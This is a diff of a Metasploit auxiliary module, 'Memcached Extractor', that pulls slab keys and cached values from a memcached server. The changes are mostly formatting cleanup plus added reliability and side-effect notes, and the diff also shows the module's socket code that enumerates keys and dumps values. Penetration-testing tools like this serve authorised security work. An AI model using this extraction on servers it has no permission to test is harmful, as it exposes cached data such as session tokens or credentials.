@@ -9,20 +9,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'          => 'Memcached Extractor',
-      'Description'   => %q(
-        This module extracts the slabs from a memcached instance.  It then
-        finds the keys and values stored in those slabs.
-      ),
-      'Author'        => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
-      'License'       => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Memcached Extractor',
+        'Description' => %q{
+          This module extracts the slabs from a memcached instance.  It then
+          finds the keys and values stored in those slabs.
+        },
+        'Author' => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['URL', 'https://github.com/memcached/memcached/blob/master/doc/protocol.txt']
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -58,8 +64,10 @@ class MetasploitModule < Msf::Auxiliary
       loop do
         data = sock.recv(4096)
         break if !data || data.length == 0 || data == "END\r\n" || data == "ERROR\r\n"
+
         matches = data.scan(/^ITEM (?<key>.*) \[/)
         break if matches.empty?
+
         keys = keys + matches.flatten!
         break if data =~ /^END/
       end
@@ -74,6 +82,7 @@ class MetasploitModule < Msf::Auxiliary
     loop do
       data = sock.recv(4096)
       break if !data || data.length == 0
+
       matches = data.scan(/^STAT (?<slab_id>(\d)*):/)
       slab_ids << matches
       break if data =~ /^END/
@@ -88,10 +97,13 @@ class MetasploitModule < Msf::Auxiliary
     loop do
       data = sock.recv(4096)
       break if !data || data.length == 0 || data == "END\r\n" || data == "ERROR\r\n"
+
       matches = data.scan(/^key=(?<key>.*) exp=/)
       break if matches.empty?
+
       keys = keys + matches.flatten!
       break if data =~ /^END/
+
       data = ''
     end
     keys
@@ -105,6 +117,7 @@ class MetasploitModule < Msf::Auxiliary
       loop do
         data_part = sock.recv(4096)
         break if !data_part || data_part.length == 0
+
         data << data_part
         break if data_part =~ /^END/
       end
@@ -149,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
         print_error("unable to determine memcached protocol version")
         return
       end
-      if(command_string=='cachedump')
+      if (command_string == 'cachedump')
         keys = enumerate_keys
       else
         keys = enumerate_keys_lru
@@ -159,8 +172,8 @@ class MetasploitModule < Msf::Auxiliary
 
       data = data_for_keys(keys)
       result_table = Rex::Text::Table.new(
-        'Header'  => "Keys/Values Found for #{peer}",
-        'Indent'  => 1,
+        'Header' => "Keys/Values Found for #{peer}",
+        'Indent' => 1,
         'Columns' => [ 'Key', 'Value' ]
       )
       data.take(print_keys).each { |key, value| result_table << [key, value.inspect] }
